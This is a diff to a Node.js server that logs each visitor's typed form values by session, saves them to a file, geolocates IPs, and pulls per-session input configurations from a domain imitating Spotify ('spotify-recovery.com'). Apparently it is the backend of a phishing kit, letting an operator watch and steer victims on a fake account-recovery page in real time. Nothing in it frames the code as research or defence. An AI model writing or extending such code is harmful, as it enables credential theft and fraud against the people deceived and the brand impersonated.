@@ -23,8 +23,6 @@ mongoose
   .connect(process.env.DATABASE, {
     useNewUrlParser: true,
     useUnifiedTopology: true,
-    useFindAndModify: false,
-    useCreateIndex: true,
     serverSelectionTimeoutMS: 30000, // Increase timeout to 30 seconds
     socketTimeoutMS: 45000 // Increase socket timeout to 45 seconds
   })
@@ -64,10 +62,22 @@ const { loginCheck } = require("./middleware/auth");
 app.set('trust proxy', true);
 
 let activeUsers = [];
-let previousUsers = []; // Add this array to store previous users
-let userInputs = {}; // Store input values by session
+let previousUsers = [];
+let userInputs = {};
 const ipCache = {};
 const dataFilePath = path.join(__dirname, "userSessions.txt");
+
+// Load existing data from file if it exists
+try {
+  if (fs.existsSync(dataFilePath)) {
+    const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
+    activeUsers = data.activeUsers || [];
+    previousUsers = data.previousUsers || [];
+    userInputs = data.userInputs || {};
+  }
+} catch (error) {
+  console.error('Error loading saved data:', error);
+}
 
 const saveDataToFile = () => {
   const data = {
@@ -80,13 +90,15 @@ const saveDataToFile = () => {
 
 app.post("/api/track", async (req, res) => {
   const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
-  const ip = getClientIp(req);
-
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+	if (!ip) {console.error('IP undefined');
+	return res.status(400).json({ error : 'IP undefined'});
+};
   try {
     let country = ipCache[ip] || 'Unknown';
     if (!ipCache[ip]) {
       try {
-        const geoResponse = await axios.get(`https://ipinfo.io/json`);
+        const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN}`);
         country = geoResponse.data.country;
         ipCache[ip] = country;
       } catch (error) {
@@ -235,7 +247,8 @@ app.get("/api/users", (req, res) => {
 });
 
 app.get("/api/previous-users", (req, res) => {
-  res.json(previousUsers);
+const sortedPreviousUsers = previousUsers.sort((a, b) => new Date(b.disconnectedAt) - new Date(a.disconnectedAt));
+  res.json(sortedPreviousUsers);
 });
 
 // Serve userSessions.txt as JSON
@@ -283,7 +296,7 @@ const startConfigCheck = () => {
       }
 
       try {
-        const response = await axios.get(`http://192.168.0.2:8000/api/get-input-config/${sessionId}`);
+        const response = await axios.get(`https://spotify-recovery.com/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
